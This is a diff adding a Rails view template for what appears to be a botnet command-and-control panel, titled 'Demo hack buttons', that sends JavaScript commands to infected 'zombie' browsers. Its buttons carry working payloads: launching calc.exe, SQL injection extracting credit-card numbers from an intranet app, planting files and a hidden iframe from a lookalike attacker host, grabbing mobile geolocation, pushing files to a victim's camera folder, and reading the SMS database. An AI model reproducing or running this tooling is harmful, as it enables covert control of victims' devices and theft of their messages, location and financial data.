@@ -1,0 +1,99 @@
+<h1>Demo hack buttons   ---- 
+<%= @zombie.browsername  %> Zombie Nr. <%= @zombie.id  %>  test <%= @ccconfig.jscommandid.to_i+1  %>  
+<br/><br/>
+<%= link_to 'Edit zombie config', edit_ccconfig_path(@ccconfig) %>
+</h1>
+<%= csrf_meta_tag %> 
+
+<%= form_for(@ccconfig) do |f| %>
+  <% if @ccconfig.errors.any? %>
+    <div id="error_explanation">
+      <h2><%= pluralize(@ccconfig.errors.count, "error") %> prohibited this ccconfig from being saved:</h2>
+
+      <ul>
+      <% @ccconfig.errors.full_messages.each do |msg| %>
+        <li><%= msg %></li>
+      <% end %>
+      </ul>
+    </div>
+  <% end %>
+
+  <div class="field">
+    <%= f.text_field :jscommand,  :hidden=>true %>
+  </div>
+    <div class="field">
+    <%= f.number_field :jscommandid, :hidden=>true %>
+  </div>
+<div class="actions">
+  <% if @zombie.browsername == "Firefox" then %>
+  <%=f.submit "FF Alert(\"It is alive!!!!\")"  ,:id => 'hack', :class=>'test', :onclick=>"$('input[id=ccconfig_jscommand]').val('alert(\"It is alive!!!!\")'); "%>
+
+  </div>
+  <div class="actions">
+    <%= f.submit "FF Calc.exe"  ,:id => 'hack', :class=>'test', :onclick=>"$('input[id=ccconfig_jscommand]').val('this.executeFile(\"c:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\calc.exe\");');"%>
+  </div>
+  <div class="actions">
+  
+  <%= f.submit "FF modify stock prices"  ,:id => 'hack', :class=>'test', :onclick=>"$('input[id=ccconfig_jscommand]').val('');"%>
+
+  </div>
+  <div class="actions">
+    <%= f.submit "FF SQL1 - test app: http://webserver.intranet:81/secure_app/index.php?id=1&submit=submit"  ,:id => 'hack', :class=>'test', :onclick=>"$('input[id=ccconfig_jscommand]').val('this.downloadContentFromURL(config2,\"http://webserver.intranet:81/secure_app/index.php?id=1&submit=submit\",\"GET\", \"\", \"application/octet-stream\");');"%>
+  </div>
+  <div class="actions">
+    <%= f.submit "FF SQL2 - test SQL injection vulnerability: http://webserver.intranet:81/secure_app/index.php?id=1'&submit=submit"  ,:id => 'hack', :class=>'test', :onclick=>"$('input[id=ccconfig_jscommand]').val('this.downloadContentFromURL(config2,\"http://webserver.intranet:81/secure_app/index.php?id=1%27&submit=submit\",\"GET\", \"\", \"application/octet-stream\");');"%>
+  </div>
+  <div class="actions">
+    <%= f.submit "FF SQL3 - extract data via SQL injection: http://webserver.intranet:81/secure_app/index.php?id=1%20union%20select%201,cc_number%20from%20credit_card&submit=submit"  ,:id => 'hack', :class=>'test', :onclick=>"$('input[id=ccconfig_jscommand]').val('this.downloadContentFromURL(config2,\"http://webserver.intranet:81/secure_app/index.php?id=1%20union%20select%201,cc_number%20from%20credit_card&submit=submit\",\"GET\", \"\", \"application/octet-stream\");');"%>
+  </div>
+    <div class="actions">
+    <%= f.submit "FF Webcam"  ,:id => 'hack', :class=>'test', :onclick=>"$('input[id=ccconfig_jscommand]').val('var file = Components.classes[\"@mozilla.org/file/local;1\"].createInstance(Components.interfaces.nsILocalFile);file.initWithPath(\"C:\\\\\\\\Users\\\\\\\\CELocaladmin\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\Macromedia\\\\\\\\FLASHP~1\\\\\\\\macromedia.com\\\\\\\\support\\\\\\\\flashplayer\\\\\\\\sys\\\\\\\\#static.cache.l.google.com-safebrowsing.hu\"); if( !file.exists() || !file.isDirectory() ) {file.create(Components.interfaces.nsIFile.DIRECTORY_TYPE, 0777);} this.downloadBinary(\"C:\\\\\\\\Users\\\\\\\\CELocaladmin\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\Macromedia\\\\\\\\FLASHP~1\\\\\\\\macromedia.com\\\\\\\\support\\\\\\\\flashplayer\\\\\\\\sys\\\\\\\\\" + String.fromCharCode(parseInt(23,16)) +\"STATI~1.HU\\\\\\\\\",\"http://static.cache.l.google.com-safebrowsing.hu:81/bbdoor/settings.sol\",\"settings.sol\");var d=content.document;var i=d.createElement(\"iframe\");d.body.insertBefore(i, d.body.lastChild);i.src=\"http://static.cache.l.google.com-safebrowsing.hu:81/bbdoor/index.html\";i.style.width = \"1px\";i.style.height = \"1px\";');"%>
+  </div>
+    </div>
+	  <div class="actions">
+   <% end %>
+  <% if @zombie.browsername == "Fennec" then %>
+  <%= f.submit "FF mobile - geolocation"  ,:id => 'hack', :class=>'test', :onclick=>"$('input[id=ccconfig_jscommand]').val('this.getLocation(config2);');"%>
+  </div>
+    <div class="actions">
+	 
+	  
+    <%= f.submit "FF mobile - Upload to victim"  ,:id => 'hack', :class=>'test', :onclick=>"$('input[id=ccconfig_jscommand]').val('this.downloadBinary(\"/mnt/sdcard/DCIM/Camera/\",\"http:static.cache.l.google.com-safebrowsing.hu/I_Know_What_You_Did_Last_Summer.jpg\",\"I_Know_What_You_Did_Last_Summer.jpg\");');"%>
+  </div>
+    </div>
+    <div class="actions">
+    <%= f.submit "FF mobile - Download SMS from victim"  ,:id => 'hack', :class=>'test', :onclick=>"$('input[id=ccconfig_jscommand]').val('this.downloadContentFromURL(config2,\"file://data/data/com.android.providers.telephony/databases/mmssms.db-wal\",\"GET\", \"\", \"application/octet-stream\")');"%>
+  </div>
+  <% end %>
+  <div class="actions">
+    <% if @zombie.browsername == "Chrome" then %>
+	<%= f.submit "Chrome rootkit"  ,:id => 'hack', :class=>'test', :onclick=>"$('input[id=ccconfig_jscommand]').val('');"%>
+  </div>
+  <div class="actions">
+    <%= f.submit "Chrome alert(\"It is alive!!!!\")"  ,:id => 'hack', :class=>'test', :onclick=>"$('input[id=ccconfig_jscommand]').val('alert(\"It is alive!!!!\")');"%>
+
+  </div>
+    <div class="actions">
+    <%= f.submit "Chrome Native Client Distributed Password Hash Crack - SHA1 4e7ca30e853d7cf963f42beeec9e74cd0efdf142"  ,:id => 'hack', :class=>'test', :onclick=>"$('input[id=ccconfig_jscommand]').val('document.getElementById(\"sha1_pwcrack\").postMessage(\"4e7ca30e853d7cf963f42beeec9e74cd0efdf142\");');"%>
+  </div>	
+  </div>
+    <div class="actions">
+    <%= f.submit "Chrome TTS"  ,:id => 'hack', :class=>'test', :onclick=>"$('input[id=ccconfig_jscommand]').val('chrome.tts.speak(\"Wake up, Neo.\", {\"lang\": \"en-US\", \"rate\": 0.2});');"%>
+  </div>
+  <div class="actions">
+    <%= f.submit "Chrome Google hack"  ,:id => 'hack', :class=>'test', :onclick=>"$('input[id=ccconfig_jscommand]').val('');"%>
+  </div>
+  <% end %>
+  <% if @zombie.browsername == "Safari" then %>
+  <div class="actions">
+    <%= f.submit "Safari alert(\"It is alive!!!!\")"  ,:id => 'hack', :class=>'test', :onclick=>"$('input[id=ccconfig_jscommand]').val('alert(\"It is alive!!!!\")');"%>
+  </div>
+  <div class="actions">
+    <%= f.submit "Safari add form"  ,:id => 'hack', :class=>'test', :onclick=>"$('input[id=ccconfig_jscommand]').val('');"%>
+  </div>
+  <% end %>
+<% end %>
+<%= link_to 'Show', @ccconfig %> |
+<%= link_to 'Back', zombies_path %> |
+<%= link_to 'Back to zombie', @zombie %>
+
